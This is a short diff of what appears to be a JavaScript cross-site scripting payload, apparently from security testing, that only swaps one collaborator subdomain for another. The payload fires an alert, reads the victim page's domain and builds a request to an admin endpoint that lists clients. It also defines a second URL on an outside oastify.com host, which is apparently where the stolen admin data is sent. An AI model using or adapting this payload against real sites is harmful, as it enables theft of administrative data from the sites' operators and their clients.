@@ -1,7 +1,7 @@
 alert(9);
 const dm = document.domain 
 const url = 'https://' + dm + '/api-v1/admin/listclients';
-const url2 = 'https://fq9hqh46tjfbt53apv51tudscjib61uq.oastify.com/'
+const url2 = 'https://ppirpr3gstelsf2ko54bs4c2bthm5dt2.oastify.com/'
 
 const data = {"clienttype":"admin","upline_id":-1,"results":25};
 
